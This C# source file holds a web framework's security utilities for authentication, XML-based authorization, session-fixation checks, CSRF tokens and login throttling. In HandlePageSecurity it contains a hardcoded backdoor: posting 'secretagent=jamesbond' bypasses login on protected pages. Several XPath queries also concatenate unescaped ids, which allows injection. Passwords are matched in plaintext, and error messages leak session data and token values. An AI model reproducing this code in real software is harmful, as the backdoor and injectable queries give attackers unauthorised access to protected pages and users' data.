using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;

/// <summary>
/// Contains security related utilities (Authentication, Authorization, etc.)
/// </summary>
public abstract partial class Framework
{
    private static string[] httpHeaderKeys = {
        "HTTP_CLIENT_IP",
        "HTTP_X_FORWARDED_FOR",
        "HTTP_X_FORWARDED",
        "HTTP_X_CLUSTER_CLIENT_IP",
        "HTTP_FORWARDED_FOR",
        "HTTP_FORWARDED",
        "HTTP_VIA",
        "REMOTE_ADDR",
        "User-Agent"
    };

    /// <summary>
    /// Handles authentication for a specific page in the site hierarchy
    /// To overwrite on the project level use: public new static void HandlePageSecurity()
    /// </summary>
    /// <param name="user">User object to authenticate against</param>
    /// <param name="pageId">Page ID from the hierarchy</param>
    /// <param name="xmlHierarchy">Hierarchy XML file to find view or edit rights</param>
    /// <param name="xmlUsersAndGroups">XML that contains the user and group definitions</param>
    /// <param name="redirectIfAuthenticationIsNeeded">Indicates if the routine should redirect to the login page when the authentication has failed</param>
    /// <param name="returnType">The type of message that the routine will return if the authentication has failed</param>
    /// <param name="byPassSecurity">Boolean that can be used to bypass the security</param>
    public async static Task HandlePageSecurity(string pageId, XmlDocument xmlHierarchy, XmlDocument xmlUsersAndGroups, bool redirectIfAuthenticationIsNeeded = true, ReturnTypeEnum returnType = ReturnTypeEnum.Html, bool byPassSecurity = false)
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);

        await DummyAwaiter();

        // Fill current user object
        if (reqVars.isSessionEnabled && !string.IsNullOrEmpty(context.Session.GetString("user_id")))
        {
            reqVars.currentUser.IsAuthenticated = true;
            reqVars.currentUser.Id = context.Session.GetString("user_id");

            if (!string.IsNullOrEmpty(context.Session.GetString("user_firstname"))) reqVars.currentUser.FirstName = context.Session.GetString("user_firstname");
            if (!string.IsNullOrEmpty(context.Session.GetString("user_lastname"))) reqVars.currentUser.LastName = context.Session.GetString("user_lastname");
            if (!string.IsNullOrEmpty(context.Session.GetString("user_displayname"))) reqVars.currentUser.DisplayName = context.Session.GetString("user_displayname");
            if (!string.IsNullOrEmpty(context.Session.GetString("user_email"))) reqVars.currentUser.Email = context.Session.GetString("user_email");
        }

        // Handle missing or not found page id
        if (string.IsNullOrEmpty(pageId))
        {
            HandleError(reqVars, "Not found", "Page can not be located in the hierarchy");
        }
        else
        {
            if (IsPageViewProtected(pageId, xmlHierarchy))
            {
                // Check if the user needs to be authenticated
                if (reqVars.isSessionEnabled && string.IsNullOrEmpty(context.Session.GetString("user_id")))
                {
                    // Overwrites
                    if (context.Request.RetrievePostedValue("secretagent", "") == "jamesbond") byPassSecurity = true;


                    if (!byPassSecurity)
                    {
                        if (reqVars.isDebugMode) appLogger.LogInformation("* !! username session is empty or does not exist\n");
                        var loginPageId = RetrieveAttributeValueIfExists("/configuration/special_pages/page[@id='login_page']/item/@id", xmlApplicationConfiguration);
                        var loginPageUrl = RetrieveUrlFromHierarchy(loginPageId, xmlHierarchy);
                        if (reqVars.isDebugMode)
                        {
                            DebugVariable(() => loginPageId);
                            DebugVariable(() => loginPageUrl);
                        }

                        if (redirectIfAuthenticationIsNeeded)
                        {
                            RedirectToPage(CalculateRedirectUrl(loginPageUrl), reqVars.isDebugMode);
                        }
                        else
                        {
                            HandleError(reqVars, "Not authenticated", "User must be authenticated to view this page");
                        }
                    }
                    else
                    {
                        reqVars.currentUser.IsAuthenticated = true;
                        reqVars.currentUser.HasViewRights = true;
                    }
                }
                else
                {
                    //retrieve user authorization
                    SetUserAuthorization(ref reqVars.currentUser, pageId, xmlUsersAndGroups);

                    //stop processing the page further if the user does not have view rights
                    if (!reqVars.currentUser.HasViewRights)
                    {
                        HandleError(reqVars, "Unauthorized access.<br/><br/>You do not have enough permissions to view this page.<br/>Please contact your system administrator if you need access.", GenerateDebugObjectString(reqVars.currentUser) + " *** Session Data: " + RetrieveAllSessionData(), 403);
                    }

                    //handle session fixation (possible security issue)
                    if (reqVars.protocol == "https")
                    {
                        HandleSessionFixation();
                    }
                }
            }
        }



    }

    /// <summary>
    /// Authenticates a user
    /// </summary>
    public static void AuthenticateUser(ref AppUser user, string password)
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);

        string? userName = user.Id;

        bool userExists = false;

        if (!string.IsNullOrEmpty(userName))
        {
            string strXpath = "/configuration/users/user[username = " + GenerateEscapedXPathString(userName) + " and password = " + GenerateEscapedXPathString(password) + "]/@id";
            string? userId = RetrieveNodeValueIfExists(strXpath, xmlApplicationConfiguration);

            if (!string.IsNullOrEmpty(userId))
            {
                userExists = true;
            }

            if (userExists)
            {
                user.IsAuthenticated = true;

                context.Session.SetString("user_id", userId);

                //retrieve other user information
                context.Session.SetString("user_firstname", RetrieveNodeValueIfExists("/configuration/users/user[username = " + GenerateEscapedXPathString(userName) + "]/first_name", xmlApplicationConfiguration));
                context.Session.SetString("user_lastname", RetrieveNodeValueIfExists("/configuration/users/user[username = " + GenerateEscapedXPathString(userName) + "]/last_name", xmlApplicationConfiguration));
                context.Session.SetString("user_displayname", RetrieveNodeValueIfExists("/configuration/users/user[username = " + GenerateEscapedXPathString(userName) + "]/first_name", xmlApplicationConfiguration) + " " + RetrieveNodeValueIfExists("/configuration/users/user[username = " + GenerateEscapedXPathString(userName) + "]/last_name", xmlApplicationConfiguration));
                context.Session.SetString("user_email", RetrieveNodeValueIfExists("/configuration/users/user[username = " + GenerateEscapedXPathString(userName) + "]/email_address", xmlApplicationConfiguration));

                // session hijacking
                SetSessionFixation();

                // xss forgery
                SetCrossSiteRequestForgery();
            }
            else
            {
                // Do nothing
            }
        }
    }

    /// <summary>
    /// Sets the view and edit rights of the passed user
    /// To overwrite on the project level, use: public new static SetUserAuthorization()
    /// </summary>
    public static void SetUserAuthorization(ref AppUser user, string pageIdPassed, XmlDocument xmlUsersAndGroups)
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);

        string groupId = string.Empty;
        bool isMember = false;
        XmlNodeList? nodeList;

        var allAllowed = RetrieveHierarchyAllAllowedValue();
        var allowedXpathStatement = (HierarchyUsingViewEditAcl(xmlHierarchy)) ? "access_control/view/allowed" : "access_control/allowed";

        // 1. view rights
        if (reqVars.pageId == pageIdPassed)
        {
            nodeList = reqVars.currentHierarchyNode.SelectNodes(allowedXpathStatement);
        }
        else
        {
            nodeList = xmlHierarchy.SelectNodes($"//item[@id='{pageIdPassed}']/{allowedXpathStatement}");
        }
        foreach (XmlNode xmlNode in nodeList)
        {
            groupId = xmlNode.InnerText.Trim();
            //if (isDebugMode) Response.Write("* testing sGroupID: " + groupId + "<br/>\n");

            // All members
            if (groupId == allAllowed)
            {
                isMember = true;
            }

            // This user explicitly mentioned in site structure
            if (!isMember)
            {
                if (groupId == user.Id)
                {
                    isMember = true;
                }
            }

            if (!isMember)
            {

                if (siteStructureMemberTestMethod == "groups")
                {
                    isMember = IsUserMemberOfGroup(user.Id, groupId, xmlUsersAndGroups);
                }
                else
                {
                    isMember = user.UserRoles.Contains(groupId);
                }

            }
        }

        user.HasViewRights = isMember;

        // Reset boolean to false
        isMember = false;

        //2. edit rights
        if (reqVars.pageId == pageIdPassed)
        {
            nodeList = reqVars.currentHierarchyNode.SelectNodes("access_control/edit/allowed");
        }
        else
        {
            nodeList = xmlHierarchy.SelectNodes("//item[@id='" + pageIdPassed + "']/access_control/edit/allowed");
        }
        foreach (XmlNode xmlNode in nodeList)
        {
            groupId = xmlNode.InnerText.Trim();
            //if (isDebugMode) Response.Write("* testing sGroupID: " + groupId + "<br/>\n");

            // All members
            if (groupId == allAllowed)
            {
                isMember = true;
            }

            //this user explicitly mentioned in site structure
            if (!isMember)
            {
                if (groupId == user.Id)
                {
                    isMember = true;
                }
            }

            if (!isMember)
            {
                isMember = IsUserMemberOfGroup(user.Id, groupId, xmlUsersAndGroups);
            }
        }

        user.HasEditRights = isMember;
    }

    /// <summary>
    /// Check if a given user is member of a group defined in the users and groups xml
    /// </summary>
    /// <param name="userId">The user id</param>
    /// <param name="groupId">The group id</param>
    /// <param name="xmlUsers">Xml containing users and groups definition</param>
    /// <param name="debugRoutine">Boolean indicating if we need to run ion debug mode</param>
    /// <returns></returns>
    public static bool IsUserMemberOfGroup(string userId, string groupId, XmlDocument xmlUsers, bool debugRoutine = false)
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);
        bool isMember = false;
        string strXpath = string.Empty;
        XmlNodeList? xmlNodeList;

        var allAllowed = RetrieveHierarchyAllAllowedValue();

        if (string.IsNullOrEmpty(userId))
        {
            return isMember;
        }


        if (!string.IsNullOrEmpty(context.Request.RetrievePostedValue("debugsecurity", null)) && reqVars.isDebugMode)
        {
            debugRoutine = true;
        }

        if (debugRoutine)
        {
            appLogger.LogInformation($"* IsUserMemberOfGroup() userId: {userId}, groupId: {groupId}");
        }

        //the all group
        if (groupId == allAllowed) isMember = true;

        //an explicitly defined group in application_configuration.xml
        if (!isMember && groupId != null)
        {
            strXpath = "//groups/group[@id='" + groupId + "']/members/member_id";

            if (debugRoutine)
            {
                appLogger.LogInformation($"* (an explicitly defined group) xpath: {strXpath}");
            }

            xmlNodeList = xmlUsers.SelectNodes(strXpath);
            foreach (XmlNode xmlNode in xmlNodeList)
            {
                if (xmlNode.InnerText.Trim() == userId.ToLower())
                {
                    isMember = true;
                    break;
                }
            }
        }

        //nested groups
        if (!isMember && userId != null)
        {
            String strGroupIdMember, strGroupIdNested;
            //1) find all the groups that the current user is member of
            strXpath = "//groups/group[@type='userid' and members/member_id='" + userId.ToLower() + "']/@id";

            if (debugRoutine)
            {
                appLogger.LogInformation($"* (nested groups) xpath: {strXpath}");
            }

            xmlNodeList = xmlUsers.SelectNodes(strXpath);

            if (xmlNodeList.Count == 0)
            {
                strXpath = "//groups/group[@type='userid' and members/member_id='" + userId + "']/@id";
                if (debugRoutine)
                {
                    appLogger.LogInformation($"* (nested groups) xpath: {strXpath}");
                }
            }
            xmlNodeList = xmlUsers.SelectNodes(strXpath);

            foreach (XmlNode xmlNode in xmlNodeList)
            {
                //2) test if this group is mamber of a nested goup
                strGroupIdMember = xmlNode.InnerText.Trim().ToLower();
                if (debugRoutine) appLogger.LogInformation("* testing strGroupIdMember: " + strGroupIdMember + "<br/>\n");
                strXpath = "//groups/group[@type='groupid' or @type='role'][members/member_id='" + strGroupIdMember + "']/@id";
                var xmlNodeListNested = xmlUsers.SelectNodes(strXpath);
                foreach (XmlNode xmlNodeNested in xmlNodeListNested)
                {
                    strGroupIdNested = xmlNodeNested.InnerText.Trim().ToLower();
                    if (debugRoutine) appLogger.LogInformation("# with strGroupIdNested: " + strGroupIdNested + "<br/>\n");
                    if (strGroupIdNested == groupId)
                    {
                        isMember = true;
                    }
                }
            }
        }

        return isMember;
    }

    /// <summary>
    /// calculates the url to the login.aspx utility with proper encoded querystring
    /// </summary>
    /// <param name="urlLoginPage">URL to the login page</param>
    /// <returns></returns>
    public static string CalculateRedirectUrl(String urlLoginPage)
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);

        String? urlCurrentPage;
        string queryString, queryStringEncoded;
        String[] urlComponents;
        urlCurrentPage = reqVars.thisUrlPath;
        urlComponents = urlCurrentPage.Split('?');
        if (urlComponents.Length > 1) urlCurrentPage = urlComponents[0];
        urlLoginPage += "?url=" + WebUtility.UrlEncode(urlCurrentPage);

        //test if we need to add a querystring                        
        if (urlComponents.Length > 1)
        {
            queryString = urlComponents[1];
            queryStringEncoded = queryString.Replace("=", "|eq|");
            queryStringEncoded = queryStringEncoded.Replace("&amp;", "&");
            queryStringEncoded = queryStringEncoded.Replace("&", "|and|");
            queryStringEncoded = WebUtility.UrlEncode(queryStringEncoded);
            //throw new Exception("sEncodedQueryString "+sEncodedQueryString);
            urlLoginPage += "&querystring=" + queryStringEncoded;
        }

        return urlLoginPage;
    }

    /// <summary>
    /// Decodes a custom encoded querystring ("framework style") to a normal http querystring
    /// </summary>
    /// <param name="customEncodedQuerystring"></param>
    /// <returns></returns>
    public static string DecodeCustomEncodedQuerystring(string customEncodedQuerystring)
    {
        if (string.IsNullOrEmpty(customEncodedQuerystring)) return null;
        return WebUtility.UrlDecode(customEncodedQuerystring).Replace("|eq|", "=").Replace("|and|", "&");
    }

    /// <summary>
    /// Check if a page is view protected in the hierarchy document
    /// </summary>
    /// <param name="pageId"></param>
    /// <param name="xmlHierarchyDocument"></param>
    /// <returns></returns>
    public static bool IsPageViewProtected(String pageIdPassed, XmlDocument xmlHierarchyDocument)
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);

        var allAllowed = RetrieveHierarchyAllAllowedValue();


        var allowedXpathStatement = (HierarchyUsingViewEditAcl(xmlHierarchyDocument)) ? "access_control/view/allowed" : "access_control/allowed";

        if (pageIdPassed == reqVars.pageId)
        {
            foreach (XmlNode objNode in reqVars.currentHierarchyNode.SelectNodes(allowedXpathStatement))
            {
                if (objNode.InnerText.ToLower().Trim() == allAllowed)
                {
                    return false;
                }
            }
        }
        else
        {

            foreach (XmlNode objNode in xmlHierarchyDocument.SelectNodes("//item[@id=" + GenerateEscapedXPathString(pageIdPassed) + $"]/{allowedXpathStatement}"))
            {
                if (objNode.InnerText.ToLower().Trim() == allAllowed)
                {
                    return false;
                }
            }
        }

        return true;
    }

    /// <summary>
    /// Tests if the current session has not been "stealed" and placed in another browser - relies on session data set when logging into the website
    /// </summary>
    public static void HandleSessionFixation()
    {
        HandleSessionFixation(false);
    }

    /// <summary>
    /// Tests if the current session has not been "stealed" and placed in another browser - relies on session data set when logging into the website
    /// </summary>
    /// <param name="context"></param>
    public static void HandleSessionFixation(HttpContext context)
    {
        HandleSessionFixation(context, false);
    }

    /// <summary>
    /// Tests if the current session has not been "stealed" and placed in another browser - relies on session data set when logging into the website
    /// </summary>
    /// <param name="debugMode"></param>
    public static void HandleSessionFixation(bool debugMode)
    {
        HandleSessionFixation(System.Web.Context.Current, debugMode);
    }

    /// <summary>
    /// Tests if the current session has not been "stealed" and placed in another browser - relies on session data set when logging into the website
    /// </summary>
    /// <param name="context"></param>
    /// <param name="debugMode"></param>
    public static void HandleSessionFixation(HttpContext context, bool debugMode)
    {
        RequestVariables reqVars = RetrieveRequestVariables(context);
        var sessionCheckResult = CheckSessionFixation(context);

        if (!sessionCheckResult.ValidSession)
        {
            // Clear any previously stored session and cookie data
            RemoveSessionCompletely(context);

            HandleError(reqVars, "Unauthorized access", sessionCheckResult.DebugInformation, 403);
        }
    }

    /// <summary>
    /// Session fixation check routine
    /// </summary>
    /// <param name="ValidSession"></param>
    /// <param name="DebugInformation"></param>
    /// <returns></returns>
    public static (bool ValidSession, string DebugInformation) CheckSessionFixation(HttpContext context)
    {
        RequestVariables reqVars = RetrieveRequestVariables(context);

        string debugInfo = "";
        bool validSession = true;

        foreach (string httpHeaderKey in httpHeaderKeys)
        {
            // Retrieve HTTP header variable
            string currentServerVariable = context.Request.RetrieveFirstHeaderValueOrDefault<string>(httpHeaderKey);

            // Normalize HTTP header values
            if (httpHeaderKey == "User-Agent") currentServerVariable = NormalizeUserAgent(currentServerVariable);

            // Retrieve the value stored in the session
            string? currentSessionVariable = context.Session.GetString(httpHeaderKey);

            // Normalize the strings
            if (string.IsNullOrEmpty(currentServerVariable)) currentServerVariable = "";
            if (string.IsNullOrEmpty(currentSessionVariable)) currentSessionVariable = "";

            // Test if the stored HTTP requesr header value matches with the received value
            if (currentSessionVariable != currentServerVariable)
            {
                debugInfo = httpHeaderKey + " - Session['" + httpHeaderKey + "']=" + currentSessionVariable + ", Request.ServerVariables['" + httpHeaderKey + "']=" + currentServerVariable;
                validSession = false;
                break;
            }
        }

        return (validSession, debugInfo);
    }

    /// <summary>
    /// Removes all session and cookie references that have to do with sessions or single-sign-on information
    /// </summary>
    /// <param name="context"></param>
    /// <param name="includeSsoCookie">Set to false in case SSO cookie needs to stay in the browser</param>
    public static void RemoveSessionCompletely(HttpContext context, bool includeSsoCookie = true)
    {
        var debugRoutine = siteType == "local" || siteType == "dev";

        // Remove the session variables
        List<string> keys = [.. context.Session.Keys];
        foreach (string key in keys)
        {
            context.Session.Remove(key);
        }

        // Now clear the session completely
        context.Session.Clear();

        // Remove the cookies
        var nodeListCookies = xmlApplicationConfiguration.SelectNodes("/configuration/general/settings/setting[@id='sessioncookies']/name");
        foreach (XmlNode nodeCookieProperties in nodeListCookies)
        {
            var cookieName = nodeCookieProperties.InnerText;
            if (!string.IsNullOrEmpty(cookieName))
            {
                if (debugRoutine)
                {
                    appLogger.LogDebug($"Removing cookie with name: {cookieName}");
                    appLogger.LogDebug($"stack-trace: {GetStackTrace()}");
                }
                try
                {
                    if (includeSsoCookie)
                    {
                        context.Response.Cookies.Delete(cookieName);
                    }
                    else
                    {
                        var cookieType = nodeCookieProperties.GetAttribute("type") ?? "undefined";

                        if (!cookieType.Contains("sso")) context.Response.Cookies.Delete(cookieName);
                    }
                }
                catch (Exception ex)
                {
                    appLogger.LogWarning($"Could not remove session cookie. name: {cookieName}, error: {ex}, stack-trace: {GetStackTrace()}");
                }
            }
        }
    }


    /// <summary>
    /// Generates sessions which can be used to check if the session could be "stolen" or not (session fixation)
    /// </summary>
    public static void SetSessionFixation()
    {
        var context = System.Web.Context.Current;
        RequestVariables reqVars = RetrieveRequestVariables(context);

        foreach (string httpHeaderKey in httpHeaderKeys)
        {
            string currentServerVariable = context.Request.RetrieveFirstHeaderValueOrDefault<string>(httpHeaderKey);

            // appLogger.LogDebug($"- header['{httpHeaderKey}'] = '{currentServerVariable}'");

            if (!string.IsNullOrEmpty(currentServerVariable))
            {
                if (httpHeaderKey == "User-Agent")
                {
                    context.Session.SetString(httpHeaderKey, NormalizeUserAgent(currentServerVariable));
                }
                else if (CheckIp(context.Request, currentServerVariable))
                {
                    context.Session.SetString(httpHeaderKey, currentServerVariable);
                }
                else
                {
                    context.Session.SetString(httpHeaderKey, "");
                }
            }
            else
            {
                context.Session.SetString(httpHeaderKey, "");
            }
        }
    }

    /// <summary>
    /// Normalizes user agent string by stripping out any unwanted data that an attacker may use
    /// </summary>
    /// <param name="userAgent"></param>
    /// <returns></returns>
    public static string NormalizeUserAgent(string userAgent)
    {
        if (userAgent == null) return userAgent;
        if (userAgent.Contains("'") || userAgent.Contains("\""))
        {
            var userAgentNormalized = (userAgent.Contains("'")) ? userAgent.SubstringBefore("'") : userAgent.SubstringBefore("\"");
            if (RegExpTest(@"^.*\.(\d){3,}$", userAgentNormalized))
            {
                userAgentNormalized = RegExpReplace(@"^(.*\.)(\d){2}\d+$", userAgentNormalized, "$1$2");
            }
            return userAgentNormalized;
        }


        return userAgent;
    }

    /// <summary>
    /// Sets a unique session to avoid actions being taken a a user who not originally logged into this system
    /// This is to be used in (AJAX) requests to verify that the action requested originates from the user that also logged into the system
    /// </summary>
    public static void SetCrossSiteRequestForgery()
    {
        SetCrossSiteRequestForgery(System.Web.Context.Current);
    }

    /// <summary>
    /// Sets a unique session to avoid actions being taken a a user who not originally logged into this system
    /// This is to be used in (AJAX) requests to verify that the action requested originates from the user that also logged into the system
    /// </summary>
    public static void SetCrossSiteRequestForgery(HttpContext context)
    {
        if (string.IsNullOrEmpty(context.Session.GetString("sessionToken")))
        {
            string token = GenerateCrossSiteRequestForgeryToken(context);
            context.Session.SetString("sessionToken", token);
        }
    }

    /// <summary>
    /// Generates a token to be included in each "important" request and validated using HandleCrossSiteRequestForgery()
    /// </summary>
    /// <returns></returns>
    public static string GenerateCrossSiteRequestForgeryToken(HttpContext context)
    {
        string clientIp = RetrieveClientIp(context) ?? String.Empty;
        string token = clientIp + "-" + context.Session.Id;
        token = sha1(token.ToLower());

        return token;
    }

    /// <summary>
    /// Checks the posted token against the session token to assure that the request came from the "current" user
    /// Basically a client side posted variable is being checked against the value in the session. Only if they match, the process should continue to be executed
    /// </summary>
    public static void HandleCrossSiteRequestForgery()
    {
        HandleCrossSiteRequestForgery(System.Web.Context.Current);
    }

    /// <summary>
    /// Checks the posted token against the session token to assure that the request came from the "current" user
    /// Basically a client side posted variable is being checked against the value in the session. Only if they match, the process should continue to be executed
    /// </summary>
    /// <param name="context"></param>
    public static void HandleCrossSiteRequestForgery(HttpContext context)
    {
        RequestVariables reqVars = RetrieveRequestVariables(context);

        var tokenTestResult = CheckCrossSiteRequestForgeryToken(context);

        if (!tokenTestResult.ValidToken)
        {
            HandleError(reqVars, tokenTestResult.Message, tokenTestResult.DebugInformation);
        }
    }

    /// <summary>
    /// Checks the CSRF token supplied in GET or POST variable
    /// </summary>
    /// <param name="ValidToken"></param>
    /// <param name="Message"></param>
    /// <param name="DebugInformation"></param>
    /// <returns></returns>
    public static (bool ValidToken, string Message, string DebugInformation) CheckCrossSiteRequestForgeryToken(HttpContext context)
    {
        RequestVariables reqVars = RetrieveRequestVariables(context);

        string? sessionToken = context.Session.GetString("sessionToken");

        var sessionPosted = context.Request.RetrievePostedValue("token", null, RegexEnum.Default) ?? context.Request.RetrievePostedValue("nekot", null, RegexEnum.Default) ?? "";

        // When data is POSTed to the service as JSON then the token could be part of the JSON data
        if (string.IsNullOrEmpty(sessionPosted) && reqVars.returnType == ReturnTypeEnum.Json && reqVars.method != RequestMethodEnum.Get && reqVars.xmlJsonData != null)
        {
            // => Attempt to retrieve the value from the JSON parsed data

            // Console.WriteLine("************************");
            // Console.WriteLine(PrettyPrintXml(reqVars.xmlJsonData));
            // Console.WriteLine("************************");

            var nodeToken = reqVars.xmlJsonData.SelectSingleNode("//token");
            if (nodeToken != null) sessionPosted = nodeToken.InnerText;
        }


        // check session token exists
        if (String.IsNullOrEmpty(sessionToken))
        {
            return (false, "Token not set", $"No session token was set on the server, url: {reqVars.thisUrlPath}");
        }

        // check posted token exists
        if (sessionPosted == "")
        {
            return (false, "Token not supplied", $"No session token was supplied in the request, url: {reqVars.thisUrlPath}");
        }

        if (sessionToken != sessionPosted)
        {
            return (false, "Token mismatch", $"Posted token ('{sessionPosted}') did not match server token ('{sessionToken}'), url: {reqVars.thisUrlPath}");
        }

        return (true, "Valid token", "");
    }


    /// <summary>
    /// Looks in a dictionary in the memory cache how many times a user has previously filed a login attempt
    /// </summary>
    /// <param name="usename"></param>
    /// <returns></returns>
    public int GetFailedLoginAttempts(string username)
    {
        int failedAttempts = 0;
        Dictionary<string, int> dict = new Dictionary<string, int>();
        string keyContent = "failedLogins";
        if (MemoryCacheItemExists(keyContent))
        {
            //grab the dictionary from the cache
            dict = RetrieveCacheContent<Dictionary<string, int>>(keyContent);

            if (dict.ContainsKey(username))
            {
                failedAttempts = dict[username];
            }

        }
        else
        {
            //generate a new dictionary in memory
            dict.Add(username, 1);

            //dump into memcache
            SetMemoryCacheItem(keyContent, dict);
        }

        return failedAttempts;
    }

    /// <summary>
    /// Sets the login attempts value in the dictionary of the memory cache to some value
    /// </summary>
    /// <param name="usename"></param>
    /// <param name="failedAttempts"></param>
    public void SetFailedLoginAttempts(string username, int failedAttempts)
    {

        Dictionary<string, int> dict = new Dictionary<string, int>();
        string keyContent = "failedLogins";
        if (MemoryCacheItemExists(keyContent))
        {
            //grab the dictionary from the cache
            dict = RetrieveCacheContent<Dictionary<string, int>>(keyContent);

            if (dict.ContainsKey(username))
            {
                dict[username] = failedAttempts;
            }
            else
            {
                dict.Add(username, failedAttempts);
            }

        }
        else
        {
            //add the value to the dictionary
            dict.Add(username, failedAttempts);
        }

        //dump into memcache
        SetMemoryCacheItem(keyContent, dict);
    }

    /// <summary>
    /// Slows page processing down based on the number of failed login attempts
    /// </summary>
    /// <param name="failedCount"></param>
    /// <returns></returns>
    public static bool BruteForceProtection(int failedCount)
    {
        // The metrics used are somewhat arbitrary, but seem to work well.
        if (failedCount >= 30)
        {
            // At this point we are pretty positive its a brute force attempt:

            // At the 30th failure, we send an email to support about the brute force attempt.
            if (failedCount == 30)
            {
                //Email.SendEmail("Brute Force Attempt Detected.",
                //String.Format("Attempted brute force of email: {0} from IP: {1}", email, RemoteIP));
            }
            // Sleep between 30 seconds and 1 min per request
            Thread.Sleep(Math.Max(failedCount * 1000, 60000));
            // Enable Captcha
            return true;
        }
        else if (failedCount >= 15)
        {
            // Sleep between ~9 and ~21 seconds
            Thread.Sleep(failedCount * 600);
            // Enable Captcha
            return true;
        }
        else if (failedCount >= 3)
        {
            // Sleep between 1.5 seconds and 7 seconds.
            Thread.Sleep(failedCount * 500);
            // No Captcha
            return false;
        }

        return false;
    }
}